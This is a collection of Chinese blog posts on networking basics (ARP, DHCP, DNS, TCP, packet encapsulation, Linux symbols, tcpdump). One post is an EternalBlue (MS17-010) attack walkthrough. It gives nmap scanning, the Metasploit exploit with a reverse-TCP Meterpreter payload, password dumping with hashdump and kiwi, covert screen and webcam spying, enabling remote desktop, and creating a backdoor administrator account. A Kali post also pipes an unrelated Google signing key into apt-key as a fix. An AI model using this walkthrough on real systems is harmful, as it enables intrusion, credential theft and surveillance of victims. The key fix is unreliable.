[{"content":"一、ARP协议简介 定义\nARP（Address Resolution Protocol，地址解析协议）是一种网络协议，用于将网络层的IP地址解析为链路层的MAC地址。 它是网络通信的基础协议之一，确保数据能够在同一网络内部正确传输。 工作原理\nARP请求：\n当主机A需要向主机B发送数据时，它会先检查自己的ARP缓存，看是否已经存储了主机B的IP地址与MAC地址的映射关系。 如果没有找到，主机A会在本地网络中广播一个ARP请求报文，询问\u0026quot;谁拥有IP地址X？请告诉我你的MAC地址。\u0026quot; ARP响应：\n主机B收到ARP请求后，会发送一个ARP响应报文，告诉主机A自己的MAC地址。 更新ARP缓存：\n主机A收到响应后，将主机B的IP地址和MAC地址的映射关系存储在自己的ARP缓存中，以便后续通信。 ARP缓存中的条目有一定的生存时间（TTL），过期后会被删除，以避免缓存中的信息过时。 二、ARP协议的作用 IP地址与MAC地址的转换：\nIP地址是网络层的逻辑地址，用于在不同网络之间进行路由。 MAC地址是链路层的物理地址，用于在同一网络内部进行数据传输。 ARP协议通过将IP地址解析为MAC地址，确保数据能够在同一网络内部正确传输。 支持网络通信：\nARP协议是网络通信的基础协议之一，它与IP协议、TCP协议等协同工作，确保数据能够在网络中正确传输。 三、ARP协议的限制 仅限于同一网络：\nARP协议仅适用于同一局域网内部的通信，无法跨网络工作。 跨网络的通信需要通过路由器进行IP地址的路由。 安全性问题：\nARP协议本身没有加密或认证机制，容易受到ARP攻击。 四、例子解释说明 假设在一个局域网中有两台主机：主机A（IP地址为192.168.1.100，MAC地址为00:11:22:33:44:55）和主机B（IP地址为192.168.1.101，MAC地址为AA:BB:CC:DD:EE:FF）。\n主机A需要向主机B发送数据：\n主机A检查自己的ARP缓存，发现没有主机B的IP地址与MAC地址的映射关系。 主机A发送ARP请求：\n主机A在局域网中广播一个ARP请求报文：\u0026ldquo;谁拥有IP地址192.168.1.101？请告诉我你的MAC地址。\u0026rdquo; 主机B响应ARP请求：\n主机B收到ARP请求后，发送一个ARP响应报文：\u0026ldquo;我是192.168.1.101，我的MAC地址是AA:BB:CC:DD:EE:FF。\u0026rdquo; 主机A更新ARP缓存：\n主机A收到ARP响应后，将主机B的IP地址和MAC地址的映射关系存储在自己的ARP缓存中。 之后，主机A就可以直接使用主机B的MAC地址发送数据了。 ","date":"2025-04-22T22:47:46+08:00","permalink":"https://souljian.cn/p/745333266/","title":"ARP协议"},{"content":" 一、DHCP协议简介 采用UDP协议，67/68端口\nDHCP（Dynamic Host Configuration Protocol，动态主机配置协议）是一种网络协议，用于自动分配IP地址和其他网络配置参数（如子网掩码、默认网关、DNS服务器地址等）。它简化了网络设备的配置过程，尤其是对于频繁接入和离开网络的设备（如笔记本电脑、手机等）。\n二、DHCP工作原理 DHCP协议的工作过程主要分为以下几个阶段：\n1. 发现阶段（Discovery） 当设备（如电脑）接入网络时，它会广播一个 DHCP Discover 数据包，询问网络中是否有可用的DHCP服务器。 由于设备还不知道自己属于哪个网络，因此它会使用广播地址（如 255.255.255.255）发送数据包。 2. 提供阶段（Offer） 网络中的DHCP服务器收到 DHCP Discover 数据包 后，会从其可用的IP地址池中选择一个未分配的IP地址，并向客户端发送一个 DHCP Offer 数据包。 DHCP Offer 数据包 中包含分配给客户端的IP地址、子网掩码、租期（IP地址的有效时间，有线默认8天，无线默认8小时）以及其他网络配置参数。 3. 请求阶段（Request） 客户端收到 DHCP Offer 数据包 后，会发送一个 DHCP Request 数据包，正式请求接受这个IP地址。 如果客户端收到多个DHCP服务器的Offer（在多台DHCP服务器的环境中），它会选择一个Offer，并向所有DHCP服务器发送 DHCP Request 数据包，通知其他服务器它已经选择了某个IP地址。 4. 确认阶段（Acknowledge） DHCP服务器收到 DHCP Request 数据包 后，会检查所分配的IP地址是否仍然可用。 如果IP地址可用，服务器会发送一个 DHCP Ack 数据包，正式确认分配的IP地址，并通知客户端可以使用该IP地址。 如果IP地址已经被占用或其他问题导致无法分配，服务器会发送一个 DHCP Nak 数据包，拒绝分配，并提示客户端重新请求（从第一阶段重来）。 三、DHCP的优势 自动化配置：设备接入网络后自动获取IP地址，无需手动配置，大大简化了网络管理。 避免冲突：DHCP服务器会检查IP地址是否已被占用，从而避免IP地址冲突。 集中管理：网络管理员可以通过DHCP服务器集中管理IP地址分配，方便调整网络配置。 灵活性：可以根据需要动态调整IP地址池和租期，适应不同的网络需求。 四、DHCP的局限性 依赖服务器：如果DHCP服务器故障，新设备将无法获取IP地址。 安全性问题：未经授权的设备可能会接入网络并获取IP地址，存在安全隐患。 配置复杂性：在大型网络中，配置和管理DHCP服务器可能较为复杂。 五、DHCP的生动例子 假设你去参加一个大型聚会，但你不知道自己的座位在哪里。于是你开始了一段寻找座位的旅程：\n发现阶段（Discovery） 你进入聚会场地后，大声喊：\u0026ldquo;有人能告诉我我的座位在哪里吗？\u0026quot;（广播 DHCP Discover 数据包）。 提供阶段（Offer） 聚会的主持人（DHCP服务器）听到你的喊声后，查看座位安排表（IP地址池），找到一个空座位，并对你说：\u0026ldquo;你可以坐那边的座位。\u0026quot;（发送 DHCP Offer 数据包）。 请求阶段（Request） 你听到主持人的话后，回应说：\u0026ldquo;好的，我接受这个座位。\u0026quot;（发送 DHCP Request 数据包）。 确认阶段（Acknowledge） 主持人确认你接受了座位后，正式对你说：\u0026ldquo;欢迎你坐下，这个座位是你的了。\u0026quot;（发送 DHCP Ack 数据包）。 通过这个过程，你成功找到了自己的座位。DHCP协议的工作原理也是如此，帮助设备在复杂的网络环境中自动找到属于自己的IP地址。\n","date":"2025-04-22T22:47:12+08:00","permalink":"https://souljian.cn/p/745333232/","title":"DHCP协议及IP自动获取"},{"content":" 一、DNS协议简介 DNS（Domain Name System）即域名系统，是互联网中用于将域名转换为IP地址的协议。它解决了用户记忆IP地址的困难，使得用户可以通过易于记忆的域名来访问网络资源。\n二、域名解析过程 1. 本地缓存查询 当用户输入一个域名时，计算机首先会在本地缓存中查找是否有该域名对应的IP地址。如果找到，直接返回IP地址，无需进一步查询。\n2. 本地DNS服务器查询 如果本地缓存中没有找到，计算机将向本地DNS服务器（通常是ISP（互联网服务提供商）提供的DNS服务器）发送查询请求。本地DNS服务器会检查自己的缓存，如果找到对应的IP地址，返回给用户；如果没有，进入下一步。\n3. 递归查询与迭代查询 递归查询：本地DNS服务器向其他DNS服务器查询，直到找到目标IP地址并返回给用户。用户只需等待最终结果，无需关心查询过程。 迭代查询：本地DNS服务器向其他DNS服务器发送查询请求后，返回一个指向其他DNS服务器的地址，由用户自己继续查询，直到找到目标IP地址。 4. 根域名服务器查询 如果本地DNS服务器无法找到目标IP地址，会向根域名服务器（如.com、.org等顶级域名服务器）查询。根域名服务器会返回一个指向权威DNS服务器的地址。\n5. 权威DNS服务器查询 最终，查询请求会到达权威DNS服务器，它会返回域名对应的IP地址。\n6. 缓存更新 查询结果会被本地DNS服务器和用户的计算机缓存起来，以便下次快速查询。\n三、DNS协议的重要性 方便用户访问：用户无需记忆复杂的IP地址，只需输入域名即可访问网站。 负载均衡：通过DNS可以将流量分配到多个服务器，提高网站的可用性和性能。 故障转移：当某个服务器出现故障时，DNS可以将流量重定向到备用服务器，确保服务的连续性。 四、DNS攻击 DNS劫持：攻击者篡改DNS解析结果，将用户引导到恶意网站。 DNS缓存污染：攻击者向DNS缓存中注入错误的IP地址，导致用户访问错误的网站。 DDoS攻击：攻击者通过大量虚假DNS查询请求，使DNS服务器瘫痪。 五、DNS解析的生动例子 假设你正在寻找一家名为\u0026quot;快乐汉堡\u0026quot;的餐厅。你只知道餐厅的名字，但不知道它的具体地址。于是你开始了一段寻找之旅：\n本地缓存查询 你先问自己的朋友（本地缓存）：\u0026ldquo;你知道快乐汉堡在哪里吗？\u0026ldquo;如果朋友知道，直接告诉你地址，你就直接去了。\n本地DNS服务器查询 如果朋友不知道，你会去问本地的导航站（本地DNS服务器）：\u0026ldquo;你知道快乐汉堡在哪里吗？\u0026ldquo;导航站会查自己的地图（缓存），如果找到了，告诉你地址；如果没有，进入下一步。\n递归查询与迭代查询\n递归查询：导航站会帮你去问其他导航站，直到找到地址，然后告诉你。 迭代查询：导航站会告诉你去下一个导航站，你自己继续问，直到找到地址。 根域名服务器查询 如果本地导航站也不知道，它会带你去城市的中心导航站（根域名服务器），那里会告诉你去哪个区域的导航站（权威DNS服务器）。\n权威DNS服务器查询 最后，你到了区域导航站（权威DNS服务器），它会告诉你\u0026quot;快乐汉堡\u0026quot;的具体地址。\n缓存更新 导航站会把\u0026quot;快乐汉堡\u0026quot;的地址记录下来，下次别人问的时候，可以直接告诉他们。\n","date":"2025-04-22T22:45:35+08:00","permalink":"https://souljian.cn/p/745333135/","title":"DNS协议与域名解析"},{"content":"kali 密钥环过期解决方案 出现以下告警：校验数字签名时出错\n可以尝试以下解决方法： 这些公钥通常用于验证从 APT 软件仓库下载的软件包的签名，以确保它们的完整性和来源的可信度。 当你运行 apt -key list 命令时，它会显示一个或多个公钥的列表，每个公钥都包含以下信息：\n公钥 ID ：一个唯一的标识符，用于区分不同的公钥。\n创建日期 ：公钥生成的日期。\n过期日期 ：公钥不再被信任的日期（如果适用）。\n用户 ID (UID) ：与公钥相关联的用户或实体的标识信息，通常包括名称和电子邮件地址。\n指纹 ：公钥的完整哈希值，用于唯一标识公钥并验证其真实性。 发现 /etc/apt/trusted.gpg.d/kali -archive -keyring.gpg 密钥环过期 apt-key list ======= 列出系统中所有已信任的 GPG 公钥 备份原密钥环 执行以下命令重新导入秘钥环 有效期更新 wget -O - https://archive.kali.org/archive-key.asc |apt-key add\n如果在执行以上指令时出现错误提示，则可以更换成以下指令重新执行\nwget -O - https://dl.google.com/linux/linux_signing_key.pub | apt-key add - reboot apt-key list apt update ：更新本地软件包索引的命令\napt upgrade ：更新已安装软件包的命令\nsudo apt update \u0026amp;\u0026amp; sudo apt upgrade ======= 更新安装软件包\n","date":"2025-04-22T13:47:28+08:00","permalink":"https://souljian.cn/p/745300848/","title":"Kali 密钥环过期解决方案"},{"content":"📦 三次握手（建立连接）——例子：快递员确认收货地址 假设你的浏览器（Chrome）是寄件人，服务器（Apache）是收件人，TCP协议（运输层）是快递公司，三次握手就像快递员上门确认地址的过程：\n1. 第一次握手（浏览器→服务器） • 动作： • 浏览器发送一个SYN=1的包裹（SYN是同步序列号请求），并生成随机序号seq=1000 • 快递员（TCP）说：\u0026ldquo;您好，我是快递员，Chrome想给Apache寄包裹，您能收吗？\u0026rdquo; • 对应原图： • 左側运输层（蓝色）→网络层→链路层→物理层，通过N1/N2路由器传递到右侧服务器\n2. 第二次握手（服务器→浏览器） • 动作： • 服务器收到SYN后，回复SYN=1 + ACK=1，序号seq=2000，确认号ack=1001 • 快递员反馈：\u0026ldquo;Apache确认能收件，请把包裹按编号1001开始发给我！\u0026rdquo; • 技术点： • ACK=1表示确认收到第一次握手 • ack=1001表示\u0026quot;我期待收到下一个编号是1001的数据\u0026quot;\n3. 第三次握手（浏览器→服务器） • 动作： • 浏览器发送ACK=1，序号seq=1001，确认号ack=2001 • 快递员说：\u0026ldquo;好的，我会按您的要求开始寄送！\u0026rdquo; • 对应原图： • 运输层（蓝色）完成三次握手，应用层（橙色）正式开始传输网页数据\n💡 为什么必须三次？ • 防止历史连接干扰：如果第一次握手的包裹卡在路由器（N1/N2）后又重复发送，服务器能通过第三次握手判断是否为过期请求 • 类似快递员必须和双方确认地址，避免寄错地方\n✋ 四次挥手（断开连接）——例子：快递员确认包裹已全部送达 当数据传输完毕，TCP需要安全断开连接，就像快递员要确认双方都没有包裹需要寄送了：\n1. 第一次挥手（浏览器→服务器） • 动作： • 浏览器发送FIN=1（FIN是结束标志），序号seq=5000 • 快递员说：\u0026ldquo;Chrome的包裹都寄完了，准备收工啦！\u0026rdquo;\n2. 第二次挥手（服务器→浏览器） • 动作： • 服务器回复ACK=1，确认号ack=5001 • 快递员反馈：\u0026ldquo;好的，我收到你的收工通知了，但等我确认Apache还有没有包裹要寄给你\u0026rdquo;\n3. 第三次挥手（服务器→浏览器） • 动作： • 服务器发送FIN=1，序号seq=8000 • 快递员说：\u0026ldquo;Apache这边也没有包裹要寄了，可以收工！\u0026rdquo;\n4. 第四次挥手（浏览器→服务器） • 动作： • 浏览器回复ACK=1，确认号ack=8001 • 快递员确认：\u0026ldquo;双方都确认完毕，连接正式关闭！\u0026rdquo;\n💡 为什么挥手要四次？ • 双向确认原则：浏览器和服务器各自独立关闭发送通道 • 第一次挥手：浏览器关闭发送 → 第二次挥手：服务器确认 • 第三次挥手：服务器关闭发送 → 第四次挥手：浏览器确认 • 类似快递员要分别确认寄件人和收件人都没有包裹了\n🌐 结合原图的分层与流程 运输层专属：三次握手和四次挥手都发生在运输层（蓝色部分），应用层（橙色）无感知 路由器N1/N2的作用：在网络层（绿色）传递握手/挥手的IP包，但不参与TCP逻辑 可靠性保障：通过序号（seq）和确认号（ack），确保数据像快递包裹一样不丢失、不重复 🛠️ 现实场景对照 访问网站时： • 打开网页瞬间完成三次握手 → 传输数据 → 关闭标签页时触发四次挥手 下载大文件时： • 握手后持续传输数据包 → 下载完成自动挥手断开 网络卡顿时： • 握手失败会显示\u0026quot;连接超时\u0026quot;，挥手异常会导致端口长时间占用 ","date":"2025-04-21T21:54:23+08:00","permalink":"https://souljian.cn/p/745243663/","title":"TCP三次握手和四次挥手"},{"content":"好的！我们结合原图用 「拆快递」 的比喻来解释解包过程，帮你把封包/解包的全流程对应到图中的每一层结构：\n📦 解包过程详解（对照原图的五层结构） 假设服务器收到你从Chrome发来的数据包（封包过程见前文），现在需要从物理层到应用层逐层解包：\n1. 物理层 → 数据链路层（撕外层包装） • 动作： • 服务器网卡收到光信号/电信号 • 将信号转换为二进制数据流（011010...） • 对应： •物理层接收信号，传递给右侧数据链路层\n2. 数据链路层（拆卡车运输箱） • 动作： • 检查数据帧的MAC地址（类似核对卡车车牌号） • 剥离MAC头部，发现目的地是当前服务器 • 如果MAC地址匹配，把数据包交给 网络层 ；不匹配则丢弃 • 对应： • 据链路层剥离封装 → 网络层 开始工作\n3. 网络层（拆地址分拣标签） • 动作： • 检查IP头部，确认目的IP是10.20.1.100（服务器自身IP） • 剥离IP头部，查看传输层协议类型（如TCP/UDP） • 如果IP不匹配且服务器是路由器，会重新转发（类似快递中转站） • 对应： •网络层剥离IP封装 → 运输层处理\n4. 运输层（拆快递小包裹） • 动作： • TCP协议检查端口号（比如目的端口80对应Apache服务） • 检查数据包顺序号和校验和，若丢包则要求重发（类似快递员打电话让你补发丢失的箱子） • 重组被拆分的多个小包裹，恢复完整数据流 • 对应： • 右侧运输层重组数据 → 应用层准备接收\n5. 应用层（拆最终包裹） • 动作： • Apache服务器解析HTTP请求内容（比如\u0026quot;请给我首页HTML\u0026quot;） • 生成响应数据（网页内容），开始反向封包过程（把包裹寄回浏览器） • 对应图示： • 右侧应用层的Apache进程处理请求，完成解包\n🔄 封包 vs 解包关键对比 过程 方向 典型动作 图示对应关系 封包 从应用层→物理层 逐层添加头部（如IP头、TCP头） 左側Chrome各层向下封装 解包 从物理层→应用层 逐层剥离头部并校验 右側Apache各层向上解封装 💡 解包过程中的核心技术 MAC地址过滤（数据链路层）： • 类似快递驿站只接收本小区快递，服务器会丢弃MAC地址不匹配的数据包 IP地址验证（网络层）： • 服务器确认数据包是\u0026quot;寄给自己\u0026quot;的，否则执行转发或丢弃 端口号映射（运输层）： • 通过目的端口80，将数据交给Apache进程（类似快递员按门牌号送货） 数据重组（运输层）： • 如果收到顺序错乱的包裹（如先收到编号3/3，再收到1/3），TCP会重新排序 应用协议解析（应用层）： • Apache根据HTTP协议解析请求内容，理解用户想要什么网页 🌐 结合原图的完整流程 封包（Chrome→N1→N2→Apache） ： • 左側橙色（应用层）→蓝色→绿色→青色→深绿色，经N1/N2路由器传递 解包（Apache←N2←N1←Chrome） ： • 右側深绿色（物理层）←青色←绿色←蓝色←橙色，逆向剥离每层封装 🛠️ 为什么分层解包重要？ • 错误隔离：如果物理层信号干扰（深绿色层），只需重传这一层数据，不影响上层 • 高效处理：网络层（绿色）快速判断IP地址，无需解析全部数据 • 灵活扩展：新增加密协议只需修改应用层（橙色），其他层保持不变\n下次看到网络分层图时，可以想象数据包像俄罗斯套娃，每一层都包裹着更核心的数据！ 🪆\n","date":"2025-04-21T21:52:46+08:00","permalink":"https://souljian.cn/p/745243566/","title":"数据包解包过程"},{"content":"我们以 10网段私有IP地址 为例（比如你家/公司内网），重新还原整个过程，重点标注源IP和目的IP：\n📦 快递运输过程（10网段IP版） 假设你的电脑IP是 10.0.0.2，要访问公司内网的服务器IP 10.20.1.100，流程如下：\n1. 应用层（对话） • 你的浏览器（Chrome） • 源IP：10.0.0.2（你的电脑） • 目的IP：10.20.1.100（公司服务器） • 请求内容：\u0026ldquo;请给我首页HTML文件\u0026rdquo;（写在快递单上的文字）\n2. 运输层（拆包+贴标签） • TCP协议处理 • 源端口：随机生成（比如54321，你的浏览器门牌号） • 目的端口：80（默认HTTP服务的门牌号） • 动作：把\u0026quot;首页请求\u0026quot;拆成多个小包裹，每个包裹标注顺序号（类似快递箱编号1/3、2/3、3/3）\n3. 网络层（找路） • 路由器N1（你的网关） • 源IP：10.0.0.2 • 目的IP：10.20.1.100 • 查路由表：\u0026ldquo;去往10.20.0.0/16网段，下一跳是路由器N2（IP 10.0.0.1）\u0026rdquo; • 类似快递分拣员：\u0026ldquo;这个包裹是10.20网段的，走3号通道到N2！\u0026rdquo;\n4. 数据链路层（卡车运输） • 从电脑到路由器N1 • 源MAC地址：AA:BB:CC:DD:EE:01（你的电脑网卡） • 目的MAC地址：AA:BB:CC:DD:EE:02（路由器N1的接口） • 动作：通过网线/WiFi传输（卡车运输）\n5. 物理层（信号传输） • 网线中的电信号或WiFi的无线电波，把二进制数据流（01101000...）从电脑传到路由器N1。\n🌐 完整路径（含IP） 1 你的电脑 (10.0.0.2) → 路由器N1 → 路由器N2 → 公司服务器 (10.20.1.100) 应用层：浏览器发起请求 → 服务器返回网页 运输层：TCP通过端口（源端口）54321→80（目标端口）保证数据顺序 网络层：IP地址（源IP）10.0.0.2→10.20.1.100（目标IP）指引方向 数据链路层：MAC地址逐段接力传输（每经过一个路由器，源/目的MAC都会改变） 物理层：网线/WiFi承载光/电信号 💡 关键点 IP地址的作用： • 类似快递收件地址，网络层靠IP地址决定包裹往哪送 • 10.x.x.x是私有IP（类似公司内部房间号），仅在局域网内使用 MAC地址的作用： • 类似卡车车牌号，数据链路层靠MAC地址完成\u0026quot;最后一公里\u0026quot;配送 • 每经过一个路由器（N1→N2），MAC地址都会更新，但IP地址始终不变 为什么用10网段？ • 私有IP地址（10.0.0.0~10.255.255.255）专用于内网 • 避免和公网IP冲突，适合企业/家庭内部通信 ","date":"2025-04-21T21:52:15+08:00","permalink":"https://souljian.cn/p/745243535/","title":"数据包封装过程"},{"content":" 一、特殊字符说明 （一）#：注释字符 功能：以 # 开头的内容被视为注释，不会被执行。\n示例：\n1 2 3 4 # This line is a comment. this_string=\u0026#34;amazing alvin\u0026#34; echo awesome ${this_string#amazing} # 输出去掉 \u0026#34;amazing\u0026#34; 的字符串 echo $this_string # 输出原始字符串 用途：用于在脚本中添加说明或临时禁用某些命令。\n（二）~：代表用户的 home 目录 功能：~ 表示当前用户的家目录。\n示例：\n1 2 cd ~ # 返回当前用户的家目录 cd ~/Documents # 进入家目录下的 Documents 文件夹 用途：快速定位到用户的家目录或其子目录。\n（三）;：分号（连续指令） 功能：分隔多个命令，即使前面的命令失败，后面的命令也会继续执行。\n示例：\n1 ls \u0026gt; count.txt; wc -l count.txt; rm count.txt 用途：在一行中执行多个命令。\n（四）/：路径分隔符 功能：用于分隔路径中的目录和文件名，/ 也表示根目录。\n示例：\n1 cd /usr/local/bin 用途：表示路径或切换到根目录。\n（五）\\：转义符 功能：\n取消特殊字符的功能。 连接多行命令。 示例：\n1 2 \\rm file.txt # 取消 rm 的别名 echo \u0026#34;Backup dir, \\$bkdir = $bkdir\u0026#34; # 输出 $bkdir 而非变量内容 用途：用于转义特殊字符或分割长命令。\n（六）|：管道符 功能：将一个命令的输出作为下一个命令的输入。\n示例：\n1 who | wc -l # 统计当前登录用户数量 用途：连接多个命令，实现复杂的数据处理。\n（七）.：当前目录 功能：表示当前目录。\n示例：\n1 ./script.sh # 执行当前目录下的 script.sh 脚本 用途：指定当前目录下的文件或脚本。\n（八）..：父目录 功能：表示当前目录的上一级目录。\n示例：\n1 cd .. # 返回上一级目录 用途：快速切换到父目录。\n（九）?：单字符通配符 功能：匹配文件名中的任意单个字符。\n示例：\n1 ls f?.txt # 匹配 f0.txt、f1.txt 等 用途：用于文件名匹配。\n（十）*：多字符通配符 功能：匹配任意长度的字符序列。\n示例：\n1 ls f*.txt # 匹配以 f 开头的所有 .txt 文件 用途：用于文件名匹配。\n（十一）!：逻辑非 功能：表示逻辑非，用于条件表达式中。\n示例：\n1 ls f[!1-9].txt # 匹配除了 f1.txt 到 f9.txt 之外的文件 用途：用于条件判断或文件名匹配。\n二、补充特殊字符 （十二）` ","date":"2025-04-21T21:24:02+08:00","permalink":"https://souljian.cn/p/745241842/","title":"Linux中特殊符号含义"},{"content":" （一）什么是永恒之蓝？ 定义：永恒之蓝（Eternal Blue）是一种利用 Windows 系统 SMB 协议漏洞（通常使用 139、445 端口）的攻击方式，攻击者通过该漏洞可获取系统最高权限，进而控制被入侵计算机。\n影响范围：\n2017 年 5 月 12 日，不法分子改造\u0026quot;永恒之蓝\u0026quot;制作了 WannaCry 勒索病毒，导致全球范围内大量机构（包括学校、大型企业和政府机构）遭受攻击。 被攻击设备被锁定，要求支付 300 美元比特币赎金，否则删除文件。 攻击通过扫描开放 445 端口的 Windows 机器，无需用户操作，开机上网即可被植入勒索软件、远程控制木马等恶意程序。 受影响国家包括乌克兰、俄罗斯、西班牙、法国、英国等，重要基础设施（政府、银行、电力系统等）均被波及。 （二）受影响的系统版本 桌面操作系统：\nWindows XP Windows Vista Windows 7 Windows 8 Windows 8.1 Windows 10 服务器操作系统：\nWindows Server 2000 Windows Server 2003 Windows Server 2008 Windows Server 2012 Windows Server 2016 备注：是否受影响取决于是否安装了对应的补丁。\n二、永恒之蓝攻击步骤 （一）内网扫描存活机器 命令：\n1 nmap -sS -p 445 192.168.110.0/24 \u0026gt; p_445 解释：\n使用 nmap 工具进行半开放扫描（-sS），扫描指定网段（192.168.110.0/24）内开放 445 端口的主机。 扫描结果保存到文件 p_445 中。 目的：找出内网中可能存在的目标主机。\n（二）确定攻击目标 操作：筛选出开放 445 端口的存活机器，确定攻击目标。 （三）测试目标连通性 命令：\n1 ping [目标IP] 解释：通过 ping 命令测试目标主机的网络连通性，确保目标主机可达。\n（四）打开 Kali 数据库 命令：\n1 2 3 service postgresql status service postgresql start service postgresql status 解释：\n查看 PostgreSQL 数据库服务的状态。 如果未开启，则启动数据库服务。 再次确认数据库服务已成功启动。 （五）数据库初始化 命令：\n1 msfdb init 解释：初始化 Metasploit 框架的数据库，为后续攻击做准备。\n（六）启动 msf 工具 命令：\n1 msfconsole 解释：启动 Metasploit 框架的控制台。\n（七）搜索永恒之蓝漏洞 命令：\n1 search ms17_010 解释：在 Metasploit 框架中搜索与 MS17-010 漏洞相关的模块。\n（八）选择扫描模块 命令：\n1 2 use auxiliary/scanner/smb/smb_ms17_010 use exploit/windows/smb/ms17_010_eternalblue 解释：\nauxiliary/scanner/smb/smb_ms17_010：用于扫描目标主机是否存在 MS17-010 漏洞（Proof of Concept，PoC 扫描）。 exploit/windows/smb/ms17_010_eternalblue：用于实际利用 MS17-010 漏洞的攻击模块。 （九）设置扫描基本配置 命令：\n1 2 3 set rhost [目标IP] set payload windows/x64/meterpreter/reverse_tcp set lhost [攻击机IP] 解释：\nrhost：设置目标主机的 IP 地址。 payload：设置攻击载荷，这里使用的是 windows/x64/meterpreter/reverse_tcp，即 64 位 Windows 系统的 Meterpreter 反向 TCP 连接。 lhost：设置攻击机的 IP 地址，用于接收目标主机的 Meterpreter 连接。 （十）开始攻击 命令：\n1 2 run exploit 解释：执行攻击，利用 MS17-010 漏洞入侵目标主机。\n（十一）攻击生效 操作：攻击成功后，可进行以下操作：\n文件上传下载 获取截屏 获取密码 开启摄像头 后门持久化等 三、漏洞利用 （一）截屏 命令：\n1 screenshot 解释：通过 Meterpreter 的 screenshot 命令获取目标主机的屏幕截图，截图保存在攻击机的 /home/mz/ 目录下。\n（二）获取账号密码 命令：\n1 2 3 4 5 hashdump load kiwi ps -S \u0026#34;csrss\u0026#34; migrate [进程号] creds_all 解释：\nhashdump：获取目标主机的用户名及加密密码。 load kiwi：加载 Kiwi 模块，用于获取更详细的凭证信息。 ps -S \u0026quot;csrss\u0026quot;：搜索 csrss.exe 进程，获取其进程号。 migrate [进程号]：将 Meterpreter 迁移到指定进程，获取更高的权限（如 SYSTEM 权限）。 creds_all：获取目标主机的所有凭证信息，包括解析加密密码。 （三）实时监控 命令：\n1 2 run vnc screenshare 解释：\nrun vnc：启动 VNC 服务，用于远程桌面监控。 screenshare：共享屏幕，实时查看目标主机的屏幕操作。 （四）开启摄像头 命令：\n1 webcam_stream 解释：通过 Meterpreter 的 webcam_stream 命令开启目标主机的摄像头，实时监控。\n四、后渗透阶段 （一）Shell 连接目标机器 命令：\n1 shell 解释：通过 Meterpreter 的 shell 命令获取目标主机的命令行交互界面。\n（二）消除乱码 命令：\n1 chcp 65001 解释：在目标主机上设置字符编码为 UTF-8，避免乱码问题。\n（三）开启目标远程桌面服务 命令：\n1 wmic RDTOGGLE WHERE ServerName=\u0026#39;%COMPUTERNAME%\u0026#39; call SetAllowTSConnections 1 解释：通过 Windows Management Instrumentation Command-line（WMIC）工具开启目标主机的远程桌面服务（默认端口 3389）。\n（四）查看端口开启状态 命令：\n1 netstat -an 解释：查看目标主机的网络连接状态，确认远程桌面服务端口（3389）是否已开启。\n（五）远程桌面连接 命令：\n1 rdesktop [目标IP] 解释：使用 rdesktop 工具连接目标主机的远程桌面服务。\n（六）登录账号密码 操作：\n如果目标主机已有账号密码，直接使用。\n如果没有，可通过以下命令新建用户并提升为管理员：\n创建用户：\n1 net user hack 123456 /add 提升为管理员：\n1 net localgroup administrators hack /add 图形化建议 你可以根据上述内容绘制以下流程图：\n攻击流程图：\n内网扫描存活机器 → 确定攻击目标 → 测试目标连通性 → 打开 Kali 数据库 → 数据库初始化 → 启动 msf 工具 → 搜索漏洞 → 选择扫描模块 → 设置扫描配置 → 开始攻击 → 攻击生效。 漏洞利用流程图：\n截屏 → 获取账号密码 → 实时监控 → 开启摄像头。 后渗透阶段流程图：\nShell 连接目标机器 → 消除乱码 → 开启远程桌面服务 → 查看端口状态 → 远程桌面连接 → 登录账号密码。 ","date":"2025-04-21T21:20:47+08:00","permalink":"https://souljian.cn/p/745241647/","title":"永恒之蓝漏洞复现"},{"content":"好的，我将在笔记中补充 -v、-vv 和 -vvv 的具体作用，并完善相关内容。\nTCPdump 命令笔记 一、简介 TCPdump 是一款强大的网络抓包工具，用于捕获和分析网络流量。它能够实时捕获网络中的数据包，并根据指定的过滤条件进行筛选和分析，是网络管理员和开发人员排查网络问题、分析网络性能的利器。\n二、基本语法 1 tcpdump [选项] [过滤条件] 三、常用选项 3.1 捕获设置 -i \u0026lt;interface\u0026gt;：指定监听的网络接口，例如eth0、wlan0或any（捕获所有接口的数据包）。 1 tcpdump -i eth0 -c \u0026lt;count\u0026gt;：捕获指定数量的数据包后停止。 1 tcpdump -i eth0 -c 100 -s \u0026lt;size\u0026gt;：设置捕获数据包的大小，默认为65535字节。 1 tcpdump -i eth0 -s 0 3.2 输出设置 -n：不解析主机名和端口名，直接显示IP地址和端口号。 1 tcpdump -i eth0 -n -nn：不解析主机名、端口名和协议名。 1 tcpdump -i eth0 -nn -X：以十六进制和ASCII格式显示数据包内容。 1 tcpdump -i eth0 -X -v、-vv、-vvv：增加输出的详细程度。 -v：显示更多详细信息，例如协议的详细字段。 -vv：显示更详细的协议信息，包括一些扩展字段。 -vvv：显示最详细的信息，包括数据包的完整内容和协议的详细解析。 1 2 3 tcpdump -i eth0 -v tcpdump -i eth0 -vv tcpdump -i eth0 -vvv 3.3 文件操作 -w \u0026lt;file\u0026gt;：将捕获的数据包保存到指定文件中。 1 tcpdump -i eth0 -w output.pcap -r \u0026lt;file\u0026gt;：从指定文件中读取数据包。 1 tcpdump -r output.pcap 四、过滤条件 TCPdump 支持丰富的过滤条件，用于筛选特定类型的数据包。\n4.1 基于协议过滤 指定协议类型，如tcp、udp、icmp等。 1 2 3 tcpdump -i eth0 tcp tcpdump -i eth0 udp tcpdump -i eth0 icmp 4.2 基于主机过滤 指定特定主机的IP地址。 1 tcpdump -i eth0 host 192.168.1.1 指定源主机或目标主机。 1 2 tcpdump -i eth0 src 192.168.1.1 tcpdump -i eth0 dst 192.168.1.1 4.3 基于端口过滤 指定特定端口号。 1 tcpdump -i eth0 port 80 指定源端口或目标端口。 1 2 tcpdump -i eth0 src port 80 tcpdump -i eth0 dst port 80 4.4 复合条件 使用逻辑运算符and、or、not组合多个条件。 1 2 tcpdump -i eth0 tcp and host 192.168.1.1 tcpdump -i eth0 tcp and port 80 or port 443 五、高级用法 5.1 捕获特定网络段 指定网络段，例如捕获192.168.1.0/24网段的数据包。 1 tcpdump -i eth0 net 192.168.1.0/24 5.2 捕获特定方向的数据包 指定数据包的传输方向。 1 2 tcpdump -i eth0 inbound tcpdump -i eth0 outbound 5.3 使用表达式过滤 使用复杂的表达式进行过滤，例如捕获特定协议和端口的组合。 1 tcpdump -i eth0 \u0026#39;tcp port 80 and (tcp[((tcp[12:1] \u0026amp; 0xf0) \u0026gt;\u0026gt; 2):4] = 0x47455420)\u0026#39; 5.4 实时分析与输出控制 使用 -l 参数可以让 tcpdump 的输出立即发送到管道命令，适用于实时分析。 1 tcpdump -i eth0 